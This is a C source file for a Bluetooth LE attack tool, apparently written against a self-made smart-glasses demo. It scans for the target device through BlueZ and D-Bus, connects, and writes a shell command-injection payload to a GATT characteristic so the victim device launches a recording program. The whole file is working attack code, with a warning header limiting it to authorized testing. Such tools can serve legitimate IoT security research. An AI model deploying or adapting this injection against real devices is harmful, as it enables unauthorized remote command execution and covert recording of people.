/*
 * Bluetooth Command Injection Testing Tool
 * 
 * WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY
 * - Only use on systems you own or have explicit permission to test
 * - Unauthorized access to devices is illegal
 * - This is for vulnerability research and educational purposes
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <glib.h>
#include <gio/gio.h>

/* Target configuration */
#define TARGET_NAME "SmartGlass_Demo"
#define CHAR_UUID   "12345678-1234-5678-1234-56789abcdef1"

/* Attack payload */
#define PAYLOAD "Hello\"; /home/matsumoto/bt_attack/Selfmade_smartglass/Recording_app/start_rec; #"

/* D-Bus constants */
#define BLUEZ_SERVICE "org.bluez"
#define ADAPTER_IFACE "org.bluez.Adapter1"
#define DEVICE_IFACE "org.bluez.Device1"
#define GATT_CHAR_IFACE "org.bluez.GattCharacteristic1"
#define PROPERTIES_IFACE "org.freedesktop.DBus.Properties"

typedef struct {
    GDBusConnection *conn;
    gchar *adapter_path;
    gchar *device_path;
    gchar *char_path;
    GMainLoop *loop;
    gboolean found;
    gboolean connected;
} AttackContext;

static void print_banner(void) {
    printf("--------------------------------------------------\n");
    printf("💀 Bluetooth 攻撃ツール (Command Injector) 起動\n");
    printf("--------------------------------------------------\n");
    printf("警告: このツールは承認されたテスト環境でのみ使用してください\n");
    printf("--------------------------------------------------\n");
}

static void log_info(const char *format, ...) {
    va_list args;
    va_start(args, format);
    printf("[*] ");
    vprintf(format, args);
    printf("\n");
    va_end(args);
}

static void log_success(const char *format, ...) {
    va_list args;
    va_start(args, format);
    printf("[+] ");
    vprintf(format, args);
    printf("\n");
    va_end(args);
}

static void log_error(const char *format, ...) {
    va_list args;
    va_start(args, format);
    printf("[!] ");
    vprintf(format, args);
    printf("\n");
    va_end(args);
}

/* Get default adapter path */
static gchar* get_adapter_path(GDBusConnection *conn) {
    GError *error = NULL;
    GVariant *result;
    
    result = g_dbus_connection_call_sync(conn,
                                         BLUEZ_SERVICE,
                                         "/",
                                         "org.freedesktop.DBus.ObjectManager",
                                         "GetManagedObjects",
                                         NULL,
                                         G_VARIANT_TYPE("(a{oa{sa{sv}}})"),
                                         G_DBUS_CALL_FLAGS_NONE,
                                         -1, NULL, &error);
    
    if (error) {
        log_error("アダプター取得エラー: %s", error->message);
        g_error_free(error);
        return NULL;
    }
    
    GVariantIter *iter;
    const gchar *object_path;
    GVariant *ifaces_and_properties;
    
    g_variant_get(result, "(a{oa{sa{sv}}})", &iter);
    
    gchar *adapter_path = NULL;
    while (g_variant_iter_next(iter, "{&o@a{sa{sv}}}", &object_path, &ifaces_and_properties)) {
        if (strstr(object_path, "/hci0")) {
            adapter_path = g_strdup(object_path);
            g_variant_unref(ifaces_and_properties);
            break;
        }
        g_variant_unref(ifaces_and_properties);
    }
    
    g_variant_iter_free(iter);
    g_variant_unref(result);
    
    return adapter_path;
}

/* Start device discovery */
static gboolean start_discovery(AttackContext *ctx) {
    GError *error = NULL;
    
    g_dbus_connection_call_sync(ctx->conn,
                                BLUEZ_SERVICE,
                                ctx->adapter_path,
                                ADAPTER_IFACE,
                                "StartDiscovery",
                                NULL, NULL,
                                G_DBUS_CALL_FLAGS_NONE,
                                -1, NULL, &error);
    
    if (error) {
        log_error("スキャン開始エラー: %s", error->message);
        g_error_free(error);
        return FALSE;
    }
    
    return TRUE;
}

/* Stop device discovery */
static void stop_discovery(AttackContext *ctx) {
    g_dbus_connection_call_sync(ctx->conn,
                                BLUEZ_SERVICE,
                                ctx->adapter_path,
                                ADAPTER_IFACE,
                                "StopDiscovery",
                                NULL, NULL,
                                G_DBUS_CALL_FLAGS_NONE,
                                -1, NULL, NULL);
}

/* Check if device name matches target */
static gboolean check_device_name(GDBusConnection *conn, const gchar *device_path) {
    GError *error = NULL;
    GVariant *result;
    
    result = g_dbus_connection_call_sync(conn,
                                         BLUEZ_SERVICE,
                                         device_path,
                                         PROPERTIES_IFACE,
                                         "Get",
                                         g_variant_new("(ss)", DEVICE_IFACE, "Name"),
                                         G_VARIANT_TYPE("(v)"),
                                         G_DBUS_CALL_FLAGS_NONE,
                                         -1, NULL, &error);
    
    if (error) {
        g_error_free(error);
        return FALSE;
    }
    
    GVariant *value;
    g_variant_get(result, "(v)", &value);
    
    const gchar *name = g_variant_get_string(value, NULL);
    gboolean match = (name && strstr(name, TARGET_NAME));
    
    g_variant_unref(value);
    g_variant_unref(result);
    
    return match;
}

/* Connect to device */
static gboolean connect_device(AttackContext *ctx) {
    GError *error = NULL;
    
    log_info("接続を試行中...");
    
    g_dbus_connection_call_sync(ctx->conn,
                                BLUEZ_SERVICE,
                                ctx->device_path,
                                DEVICE_IFACE,
                                "Connect",
                                NULL, NULL,
                                G_DBUS_CALL_FLAGS_NONE,
                                30000, NULL, &error);
    
    if (error) {
        log_error("接続エラー: %s", error->message);
        g_error_free(error);
        return FALSE;
    }
    
    log_success("接続成功！ (Connected)");
    
    /* Wait for services to be resolved */
    sleep(2);
    
    return TRUE;
}

/* Find characteristic path */
static gchar* find_characteristic(GDBusConnection *conn, const gchar *device_path) {
    GError *error = NULL;
    GVariant *result;
    
    result = g_dbus_connection_call_sync(conn,
                                         BLUEZ_SERVICE,
                                         "/",
                                         "org.freedesktop.DBus.ObjectManager",
                                         "GetManagedObjects",
                                         NULL,
                                         G_VARIANT_TYPE("(a{oa{sa{sv}}})"),
                                         G_DBUS_CALL_FLAGS_NONE,
                                         -1, NULL, &error);
    
    if (error) {
        log_error("オブジェクト取得エラー: %s", error->message);
        g_error_free(error);
        return NULL;
    }
    
    GVariantIter *iter;
    const gchar *object_path;
    GVariant *ifaces_and_properties;
    
    g_variant_get(result, "(a{oa{sa{sv}}})", &iter);
    
    gchar *char_path = NULL;
    while (g_variant_iter_next(iter, "{&o@a{sa{sv}}}", &object_path, &ifaces_and_properties)) {
        if (strstr(object_path, device_path)) {
            GVariantIter *iface_iter;
            const gchar *iface_name;
            GVariant *properties;
            
            g_variant_get(ifaces_and_properties, "a{sa{sv}}", &iface_iter);
            
            while (g_variant_iter_next(iface_iter, "{&s@a{sv}}", &iface_name, &properties)) {
                if (strcmp(iface_name, GATT_CHAR_IFACE) == 0) {
                    GVariant *uuid_variant = g_variant_lookup_value(properties, "UUID", G_VARIANT_TYPE_STRING);
                    if (uuid_variant) {
                        const gchar *uuid = g_variant_get_string(uuid_variant, NULL);
                        if (strcasecmp(uuid, CHAR_UUID) == 0) {
                            char_path = g_strdup(object_path);
                        }
                        g_variant_unref(uuid_variant);
                    }
                }
                g_variant_unref(properties);
                if (char_path) break;
            }
            
            g_variant_iter_free(iface_iter);
        }
        g_variant_unref(ifaces_and_properties);
        if (char_path) break;
    }
    
    g_variant_iter_free(iter);
    g_variant_unref(result);
    
    return char_path;
}

/* Write payload to characteristic */
static gboolean write_payload(GDBusConnection *conn, const gchar *char_path) {
    GError *error = NULL;
    
    log_info("悪意あるペイロードを生成中: %s", PAYLOAD);
    log_info("データを送信中 (Injecting)...");
    
    /* Convert payload to byte array */
    GVariantBuilder *builder = g_variant_builder_new(G_VARIANT_TYPE("ay"));
    for (const char *p = PAYLOAD; *p; p++) {
        g_variant_builder_add(builder, "y", *p);
    }
    
    GVariant *value = g_variant_new("ay", builder);
    GVariant *options = g_variant_new_array(G_VARIANT_TYPE("{sv}"), NULL, 0);
    
    g_dbus_connection_call_sync(conn,
                                BLUEZ_SERVICE,
                                char_path,
                                GATT_CHAR_IFACE,
                                "WriteValue",
                                g_variant_new("(@ay@a{sv})", value, options),
                                NULL,
                                G_DBUS_CALL_FLAGS_NONE,
                                -1, NULL, &error);
    
    g_variant_builder_unref(builder);
    
    if (error) {
        log_error("書き込みエラー: %s", error->message);
        g_error_free(error);
        return FALSE;
    }
    
    log_success("送信完了！ 攻撃が実行されたはずです。");
    return TRUE;
}

/* Signal handler for device discovery */
static void on_interface_added(GDBusConnection *connection,
                                const gchar *sender_name,
                                const gchar *object_path,
                                const gchar *interface_name,
                                const gchar *signal_name,
                                GVariant *parameters,
                                gpointer user_data) {
    AttackContext *ctx = (AttackContext *)user_data;
    
    if (ctx->found) return;
    
    const gchar *device_path;
    GVariant *interfaces;
    
    g_variant_get(parameters, "(&o@a{sa{sv}})", &device_path, &interfaces);
    
    if (check_device_name(ctx->conn, device_path)) {
        log_success("発見しました: %s", device_path);
        ctx->device_path = g_strdup(device_path);
        ctx->found = TRUE;
        
        stop_discovery(ctx);
        g_main_loop_quit(ctx->loop);
    }
    
    g_variant_unref(interfaces);
}

/* Timeout handler for discovery */
static gboolean on_discovery_timeout(gpointer user_data) {
    AttackContext *ctx = (AttackContext *)user_data;
    
    if (!ctx->found) {
        log_error("ターゲットが見つかりませんでした。被害者側のサーバーは起動していますか？");
        stop_discovery(ctx);
        g_main_loop_quit(ctx->loop);
    }
    
    return FALSE;
}

int main(int argc, char *argv[]) {
    GError *error = NULL;
    AttackContext ctx = {0};
    int result = 1;
    
    print_banner();
    
    /* Connect to system bus */
    ctx.conn = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
    if (!ctx.conn) {
        log_error("D-Bus接続エラー: %s", error->message);
        g_error_free(error);
        return 1;
    }
    
    /* Get adapter */
    ctx.adapter_path = get_adapter_path(ctx.conn);
    if (!ctx.adapter_path) {
        log_error("Bluetoothアダプターが見つかりません");
        goto cleanup;
    }
    
    /* Start discovery */
    log_info("ターゲット '%s' を捜索中...", TARGET_NAME);
    
    ctx.loop = g_main_loop_new(NULL, FALSE);
    
    g_dbus_connection_signal_subscribe(ctx.conn,
                                       BLUEZ_SERVICE,
                                       "org.freedesktop.DBus.ObjectManager",
                                       "InterfacesAdded",
                                       NULL, NULL,
                                       G_DBUS_SIGNAL_FLAGS_NONE,
                                       on_interface_added,
                                       &ctx, NULL);
    
    if (!start_discovery(&ctx)) {
        goto cleanup;
    }
    
    g_timeout_add_seconds(10, on_discovery_timeout, &ctx);
    
    g_main_loop_run(ctx.loop);
    
    if (!ctx.found) {
        goto cleanup;
    }
    
    /* Connect to device */
    if (!connect_device(&ctx)) {
        goto cleanup;
    }
    
    /* Find characteristic */
    ctx.char_path = find_characteristic(ctx.conn, ctx.device_path);
    if (!ctx.char_path) {
        log_error("Characteristicが見つかりません");
        goto cleanup;
    }
    
    /* Execute attack */
    if (write_payload(ctx.conn, ctx.char_path)) {
        log_info("切断します。");
        result = 0;
    }
    
cleanup:
    g_free(ctx.adapter_path);
    g_free(ctx.device_path);
    g_free(ctx.char_path);
    if (ctx.loop)
        g_main_loop_unref(ctx.loop);
    if (ctx.conn)
        g_object_unref(ctx.conn);
    
    return result;
}